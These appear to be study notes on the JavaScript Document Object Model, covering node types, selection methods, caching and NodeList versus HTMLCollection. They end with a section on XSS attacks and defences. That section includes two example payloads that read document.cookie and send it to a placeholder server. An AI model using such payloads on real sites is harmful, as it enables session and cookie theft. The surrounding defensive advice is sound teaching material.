# Document Object Model

Not a part of HTML & not a part of JS, the DOM specifies how a browser should model an HTML page and how JS can update the contents of that page.

## The DOM Tree

Four types of node:

1. **Document:** Represents the entire page, corresponds with the `document` object. Every node is accessed through this one.
2. **Element:** Describe the structure of an HTML page. After finding an element node, you can then access its attribute or text nodes.
3. **Attribute:** Not children of an element node but part of that element.
4. **Text:** Child of the element node. Cannot have children itself - therefore always a new branch of the DOM tree, no further branches can come off it.

## Working with the DOM Tree

Two steps:

1. Access the element
   - Select an individual element with `getElementById()`, `querySelector()`
   - Select multiple elements with `getElementsByClassName()`, `getElementsByTagName()`, `querySelectorAll()`
     - These methods always return a `NodeList`, even if only one element matches
   - Traverse between nodes with `parentNode`, `previousSibling`/`nextSibling`, `firstChild`/`lastChild`
2. Work with the element
   - Access/update text nodes with `nodeValue`, `textContent`, `innerText`
     - Faster than `innerHTML` because they don't parse HTML, just use straight text
     - `nodeValue` and `textContent` are basically the same but `nodeValue` only works on text nodes. It is older and lesser seen
     - `innerText` takes style into account so is the slowest - e.g. won't return text hidden by `display: none`
   - Work with HTML content with `innerHTML`, or add more nodes with `createElement()`, `createTextNode()`, `appendChild()`/`removeChild()`
   - Access/update attributes with `className`/`id`, `hasAttribute()`, `getAttribute()`, `setAttribute()`, `removeAttribute()`

> Inconsistencies between browsers and the code examples mentioned above is one of the main reasons for jQuery's popularity.

## Caching DOM Queries

- To save the interpreter searching the DOM tree every time you want to work with a particular element, you can use a variable to store the result of your query
- The variable stores a reference to the node object (the location), it doesn't store the node itself
- e.g. `var itemOne = getElementById('one`);
- Any updates to the variable will be reflected by the node and subsequently the HTML of the web page

### Selector Speed

- `getElementById()` and `getElementsByClassName()` are about twice as fast as the others.
- CSS selectors in ascending order of runtime:
  1. ID
  2. Class
  3. Tag
  4. General/adjacent sibling (`~`, `+`)
  5. Child and descendent (space, `>`)
  6. Universal (`*`)
  7. Attribute
  8. Pseudo-class/pseudo-element

## Query return values

- `getElementsByClassName()`: `HTMLCollection`, live
- `getElementsByTagName()`: `HTMLCollection`, live
- `querySelectorAll()`: `NodeList`, static
- `getElementsByName()`: `NodeList`, live

### `HTMLCollection` vs. `NodeList`

- `HTMLCollections` represent a **list** of DOM nodes, are always live.
  - List of nodes
  - Access methods are by a node's `name` or `id` attributes
  - Only have `item()` and `namedItem()` methods
- `NodeLists` represent a **collection** of nodes and are a more general construct, not necessarily live
  - Reflect whatever the selector matches at the time of the query
  - The nodes themselves may or may not be in the actual DOM, depending on the interface used to retrieve them
  - Have more methods including `item()`, `forEach()`, `entries()`, `keys()`, `values()`

## XSS Attacks

- Involves an attacker placing malicious code into a site, e.g. through user-submitted content as comments or account details
- Can give an attacker access to information in the DOM, website cookies, session tokens. Can allow them to make fraudulent purchases, post bad content, spread malicious code further
- Examples:
  - `<script>var = adr='http://example.com/xss.php?cookie=' + escape(document.cookie);</script>` can store cookie data in a variable, then send it to a 3rd-party server
  - `img src='http://nofile' onerror='adr="http://example.com/xss.php?" + escape(document.cookie)';` can be used to trigger malicious code on an image error

### Defending against XSS

1. Validate input:
   - Only let users input a subset of characters
   - Do not allow untrusted users to submit anything
   - Double-check validation server-side, in case the user has bypassed validation client-side by disabling JS
     - Eliminate JS by escaping all ASCII characters with value < 256 that aren't alphanumeric
2. Escape data from the server
   - As data leaves the db, escape all potentially dangerous characters to prevent parsing
     - Most dbs will have helper functions to strip this kind of content
     - E.g. always escape HTML entities like `&amp;`, `quot;` etc.
   - Ensure content generated by users is only being added to certain sections of template files
     - For user-submitted URLs, use `encodeURIComponent()` to encode `,`, `/`, `?`, `:`, `@`, `&`, `=`, `+`, `$`, `#`\
     - Never add untrusted content to script tags, HTML comments, tag names, attributes, or CSS values
   - Do not create HTML fragments from untrusted sources; only add as text after escaping
